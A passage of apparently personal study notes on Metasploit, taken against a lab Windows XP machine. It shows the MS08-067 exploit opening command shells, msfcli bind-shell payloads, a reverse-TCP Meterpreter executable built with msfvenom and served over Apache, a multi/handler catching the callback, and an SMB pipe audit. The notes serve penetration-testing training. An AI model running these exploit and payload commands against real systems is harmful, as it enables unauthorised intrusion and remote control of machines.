   <span class="mi">0</span>   <span class="n">Automatic</span> <span class="n">Targeting</span>
</pre></div>
</td></tr></table>

<ul>
<li>setting the local host</li>
</ul>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>msf  exploit(ms08_067_netapi) &gt; set LHOST _&lt;local_host_ip&gt;_
</pre></div>
</td></tr></table>

<ul>
<li>running the exploit again</li>
</ul>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>msf  exploit(ms08_067_netapi) &gt; exploit

[*] Started reverse handler on 192.168.20.9:4444 ❶
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX) ❷
[*] Attempting to trigger the vulnerability...
[*] Command shell session 2 opened (192.168.20.9:4444 -&gt; 192.168.20.10:1374)
    at 2015-08-31 10:29:36 -0400

Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32&gt;
</pre></div>
</td></tr></table>

<ul>
<li>closing the shell</li>
</ul>
<p>To close the shell, type ctrl-C and enter <strong><code class="codehilite">y</code></strong> at the prompt to abort the session.</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>C:\WINDOWS\system32&gt;^C
Abort session 2? [y/N]  y

[*] Command shell session 2 closed.  Reason: User exit
msf  exploit(ms08_067_netapi) &gt;
</pre></div>
</td></tr></table>

<h3 id="msfcli">Msfcli</h3>
<p>Msfcli is a command line interface. Used particularly when metasploit is used within scripts and for testing metasploit modules</p>
<ul>
<li>getting help for msfcli</li>
</ul>
<p>use the <code class="codehilite">-h</code> flag to get help on the msfcli command</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>root@kali:~# msfcli -h
❶ Usage: /opt/metasploit/apps/pro/msf3/msfcli &lt;exploit_name&gt; &lt;option=value&gt; [mode]
  ==============================================================================

      Mode           Description
      ----           -----------
      (A)dvanced     Show available advanced options for this module
      (AC)tions      Show available actions for this auxiliary module
      (C)heck        Run the check routine of the selected module
      (E)xecute      Execute the selected module
      (H)elp         You&#39;re looking at it baby!
      (I)DS Evasion  Show available ids evasion options for this module
     ❷(O)ptions      Show available options for this module
     ❸(P)ayloads     Show available payloads for this module
      (S)ummary      Show information about this module
      (T)argets      Show available targets for this exploit module
</pre></div>
</td></tr></table>

<ul>
<li>useful modes in msfcli</li>
</ul>
<p>msfcli has some modes built-in to build the final command</p>
<ul>
<li><code class="codehilite">o</code> mode shows the selected module's options  </li>
<li>
<p><code class="codehilite">P</code> shows the compatible payloads</p>
</li>
<li>
<p>showing options</p>
</li>
</ul>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>root@kali:~# msfcli windows/smb/ms08_067_netapi O
[*] Please wait while we load the module tree...

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
<span class="hll">   RHOST                     yes       The target address
</span>   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
</pre></div>
</td></tr></table>

<ul>
<li>setting host</li>
</ul>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10
</pre></div>
</td></tr></table>

<ul>
<li>showing payloads</li>
</ul>
<p><code class="codehilite">P</code> shows the compatible payloads</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="hll">root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 P
</span>[*] Please wait while we load the module tree...

Compatible payloads
===================

   Name                                             Description
   ----                                             -----------
   generic/custom                                   Use custom string or file as payload. Set
                                                      either PAYLOADFILE or PAYLOADSTR.
   generic/debug_trap                               Generate a debug trap in the target process
   generic/shell_bind_tcp                           Listen for a connection and spawn a command
                                                      shell
   generic/shell_reverse_tcp                        Connect back to attacker and spawn a command
                                                      shell
   generic/tight_loop                               Generate a tight loop in the target process
--snip--
</pre></div>
</td></tr></table>

<ul>
<li>setting payloads</li>
</ul>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="hll">root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 PAYLOAD=windows/shell_bind_tcp
</span>[*] Please wait while we load the module tree...

RHOST =&gt; 192.168.20.10
PAYLOAD =&gt; windows/shell_bind_tcp
[*] Started bind handler ❶
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] Attempting to trigger the vulnerability...
[*] Command shell session 1 opened (192.168.20.9:35156 -&gt; 192.168.20.10:4444)
    at 2015-08-31 16:43:54 -0400

Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32&gt;
</pre></div>
</td></tr></table>

<ul>
<li>running the exploit</li>
</ul>
<p>use the <code class="codehilite">E</code> flag to tell msfcli to run the exploit</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="hll">root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 PAYLOAD=windows/shell_bind_tcp E
</span>[*] Please wait while we load the module tree...

RHOST =&gt; 192.168.20.10
PAYLOAD =&gt; windows/shell_bind_tcp
[*] Started bind handler ❶
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] Attempting to trigger the vulnerability...
[*] Command shell session 1 opened (192.168.20.9:35156 -&gt; 192.168.20.10:4444)
    at 2015-08-31 16:43:54 -0400

Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32&gt;
</pre></div>
</td></tr></table>

<h3 id="creating_standalone_payloads_with_msfvenom">Creating Standalone Payloads With Msfvenom</h3>
<ul>
<li>view the help page of msfvenom</li>
</ul>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>root@kali:~# msfvenom - h
</pre></div>
</td></tr></table>

<ul>
<li>listing all payloads</li>
</ul>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>root@kali:~# msfvenom -l payloads
</pre></div>
</td></tr></table>

<ul>
<li>setting payload</li>
</ul>
<p>use the <code class="codehilite">-p</code> flag to set the payload</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp
</pre></div>
</td></tr></table>

<ul>
<li>setting options</li>
</ul>
<p>use the <code class="codehilite">-o</code> flag to set the options</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp -o
[*] Options for payload/windows/meterpreter/reverse_tcp

    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
    EXITFUNC  process          yes       Exit technique: seh, thread, process,
                                           none
    LHOST                      yes       The listen address
    LPORT     4444             yes       The listen port
</pre></div>
</td></tr></table>

<p>set the <code class="codehilite">LHOST</code> using the option <code class="codehilite">LHOST=12345</code></p>
<ul>
<li>choosing the output format</li>
</ul>
<p>use the command <code class="codehilite">msfvenom --help-formats</code> to show the output formats</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6
7</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>root@kali:~# msfvenom --help-formats
Executable formats
    asp, aspx, aspx-exe, dll, elf, exe, exe-only, exe-service, exe-small,
      loop-vbs, macho, msi, msi-nouac, psh, psh-net, vba, vba-exe, vbs, war
Transform formats
    bash, c, csharp, dw, dword, java, js_be, js_le, num, perl, pl, powershell,
      psl, py, python, raw, rb, ruby, sh, vbapplication, vbscript
</pre></div>
</td></tr></table>

<ul>
<li>selecting the output format</li>
</ul>
<p>use the <code class="codehilite">-f</code> flag to set the output format</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>root@kali:~# msfvenom windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe
</pre></div>
</td></tr></table>

<ul>
<li>redirecting the output to a file</li>
</ul>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe &gt; chapter4example.exe
</pre></div>
</td></tr></table>

<p>There is no output to the screen, but if we run the file command on our newly created executable file, we see that it’s a Windows executable that will run on any Windows system as long as a user attempts to run it.</p>
<h3 id="serving_payloads">Serving Payloads</h3>
<ul>
<li>upload the payload to the webserver</li>
</ul>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>root@kali:~# cp chapter4example.exe /var/www
root@kali:~# service apache2 start
Starting web server apache2
</pre></div>
</td></tr></table>

<p>browse the target machine and point the browser to the following url to <em><a href="http://192.168.20.9/chapter4example.exe">http://192.168.20.9/chapter4example.exe</a></em> and download the file.</p>
<p>Before executing the file, a handler needs to be configured. </p>
<ul>
<li>using the multi/handler module</li>
</ul>
<p>allows to set up standalone handlers. We need to catch the meterpreter connection when the malicious executable is executed from the target machine.</p>
<ul>
<li>using the multi/handle module</li>
</ul>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="n">msf</span> <span class="o">&gt;</span> <span class="n">use</span> <span class="n">multi</span><span class="o">/</span><span class="n">handler</span>
<span class="n">msf</span>  <span class="n">exploit</span><span class="p">(</span><span class="n">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="k">set</span> <span class="n">PAYLOAD</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
<span class="n">PAYLOAD</span> <span class="o">=&gt;</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
<span class="n">msf</span>  <span class="n">exploit</span><span class="p">(</span><span class="n">handler</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">show</span> <span class="n">options</span>

<span class="k">Module</span> <span class="nn">options</span> <span class="p">(</span><span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span><span class="p">):</span>

   <span class="n">Name</span>  <span class="n">Current</span> <span class="n">Setting</span>  <span class="n">Required</span>  <span class="n">Description</span>
   <span class="o">----</span>  <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>


<span class="n">Payload</span> <span class="n">options</span> <span class="p">(</span><span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span><span class="p">):</span>

   <span class="n">Name</span>      <span class="n">Current</span> <span class="n">Setting</span>  <span class="n">Required</span>  <span class="n">Description</span>
   <span class="o">----</span>      <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
   <span class="n">EXITFUNC</span>  <span class="n">process</span>          <span class="n">yes</span>       <span class="k">Exit</span> <span class="n">technique</span><span class="p">:</span> <span class="n">seh</span><span class="p">,</span> <span class="n">thread</span><span class="p">,</span> <span class="n">process</span><span class="p">,</span>
                                          <span class="n">none</span>
   <span class="n">LHOST</span>                      <span class="n">yes</span>       <span class="n">The</span> <span class="n">listen</span> <span class="n">address</span>
   <span class="n">LPORT</span>     <span class="mi">4444</span>             <span class="n">yes</span>       <span class="n">The</span> <span class="n">listen</span> <span class="n">port</span>

<span class="o">--</span><span class="n">snip</span><span class="o">--</span>
<span class="n">msf</span>  <span class="n">exploit</span><span class="p">(</span><span class="n">handler</span><span class="p">)</span> <span class="o">&gt;</span>
</pre></div>
</td></tr></table>

<p>set the <code class="codehilite">LHOST</code> and the <code class="codehilite">LPORT</code> using the following commands</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>msf  exploit(handler) &gt; set LHOST 192.168.20.9
LHOST =&gt; 192.168.20.9
msf  exploit(handler) &gt; set LPORT 12345
LPORT =&gt; 12345
msf  exploit(handler) &gt; exploit

[*] Started reverse handler on 192.168.20.9:12345
[*] Starting the payload handler...
</pre></div>
</td></tr></table>

<p>now the handler is listening ...</p>
<p>login to the target machine and run the executable - we get the following shell</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>[*] Sending stage (752128 bytes) to 192.168.20.10
[*] Meterpreter session 1 opened (192.168.20.9:12345 -&gt; 192.168.20.10:49437) at 2015-09-01 11:20:00 -0400

meterpreter &gt;
</pre></div>
</td></tr></table>

<h3 id="using_an_auxiliary_module">Using an Auxiliary Module</h3>
<p>modules not used for exploitation are called <em>auxiliary modules</em>. They include things like vulnerability scanners, fuzzers and even DoS modules</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>A good rule of thumb to remember is that exploit modules use a payload and auxiliary modules do not.</p>
</div>
<ul>
<li>auxiliary module to enumerate the listening pipes on a SMB server</li>
</ul>
<p><code class="codehilite">auxiliary/scanner/smb/pipe_auditor</code></p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="n">msf</span> <span class="o">&gt;</span> <span class="n">use</span> <span class="n">scanner</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">pipe_auditor</span>
<span class="n">msf</span>  <span class="n">auxiliary</span><span class="p">(</span><span class="n">pipe_auditor</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">show</span> <span class="n">options</span>

<span class="k">Module</span> <span class="nn">options</span> <span class="p">(</span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">pipe_auditor</span><span class="p">):</span>

   <span class="n">Name</span>       <span class="n">Current</span> <span class="n">Setting</span>  <span class="n">Required</span>  <span class="n">Description</span>
   <span class="o">----</span>       <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
<span class="hll">   <span class="n">RHOSTS</span>                      <span class="n">yes</span>       <span class="n">The</span> <span class="n">target</span> <span class="n">address</span> <span class="n">range</span> <span class="ow">or</span> <span class="n">CIDR</span> <span class="n">identifier</span>
</span>   <span class="n">SMBDomain</span>  <span class="n">WORKGROUP</span>        <span class="n">no</span>        <span class="n">The</span> <span class="n">Windows</span> <span class="n">domain</span> <span class="k">to</span> <span class="n">use</span> <span class="k">for</span> <span class="n">authentication</span>
   <span class="n">SMBPass</span>                     <span class="n">no</span>        <span class="n">The</span> <span class="n">password</span> <span class="k">for</span> <span class="n">the</span> <span class="n">specified</span> <span class="n">username</span>
   <span class="n">SMBUser</span>                     <span class="n">no</span>        <span class="n">The</span> <span class="n">username</span> <span class="k">to</span> <span class="n">authenticate</span> <span class="ow">as</span>
<span class="hll">   <span class="n">THREADS</span>    <span class="mi">1</span>                <span class="n">yes</span>       <span class="n">The</span> <span class="n">number</span> <span class="k">of</span> <span class="n">concurrent</span> <span class="n">threads</span>
</span></pre></div>
</td></tr></table>

<p>Multiple remote hosts can be specified</p>
<p>The THREADS option allows us to control the speed of Metasploit by having our module run in multiple threads</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>msf  auxiliary(pipe_auditor) &gt; set RHOSTS 192.168.20.10
RHOSTS =&gt; 192.168.20.10
</pre></div>
</td></tr></table>

<p>Though nothing is being technically exploited, metasploit can be made to run the auxiliary module using the <code class="codehilite">exploit</code> command</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>msf  auxiliary(pipe_auditor) &gt; exploit

<span class="hll">[*] 192.168.20.10 - Pipes: \browser
</span>[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf  auxiliary(pipe_auditor) &gt;
</pre></div>
</td></tr></table>

<p>The module audits the listening SMB pipes on the target machine and it turns out that the target has only one SMB pipe i.e. BROWSER</p>
<h3 id="upgrading_metasploit">Upgrading Metasploit</h3>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>root@kali:~# msfupdate
</pre></div>
</td></tr></table>
                
                  
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../../programming/python-programming/" title="Python Programming" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                Python Programming
              </span>
            </div>
          </a>
        
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            Copyright &copy; ha2332-2019
          </div>
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../assets/javascripts/application.48c2c9de.js"></script>
      
      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
      
        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML"></script>
      
        <script src="../../assets/javascript/jquery-min.js"></script>
      
        <script src="../../assets/javascript/mermaid.min.js"></script>
      
        <script src="../../assets/javascript/raphael.min.js"></script>
      
        <script src="../../assets/javascript/flowchart.min.js"></script>
      
        <script src="../../assets/javascript/jquery-plugin.js"></script>
      
        <script src="../../assets/javascript/extra.js"></script>
      
    
  </body>
</html>